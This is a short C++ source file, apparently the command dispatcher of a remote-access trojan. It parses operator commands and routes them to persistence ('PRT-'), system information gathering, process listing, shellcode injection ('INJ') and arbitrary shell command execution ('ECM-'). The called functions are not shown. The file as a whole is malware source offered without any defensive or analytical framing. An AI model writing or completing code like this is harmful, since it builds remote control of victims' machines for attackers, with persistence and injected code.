#include "Handler.h"

LPCSTR HandleCommand(LPCSTR command){

	std::string data = command;

	if(strstr(command,"PRT-") != NULL){
		data.erase(0,4);
		DWORD method = atoi(data.c_str());
		return Persist(method);
	}
	else if(strstr(command,"SYS") != NULL){
		return SystemInfo();
	}
	else if(strstr(command,"PSL") != NULL){
		return ProcessList();
	}
	else if(strstr(command,"INJ") != NULL){
		return ExecuteShellcode();
	}
	else if(strstr(command,"ECM-") != NULL){
		data.erase(0,4);
		return ExecuteShell(data.c_str());
	}

	return "ERROR HANDLING COMMAND";

}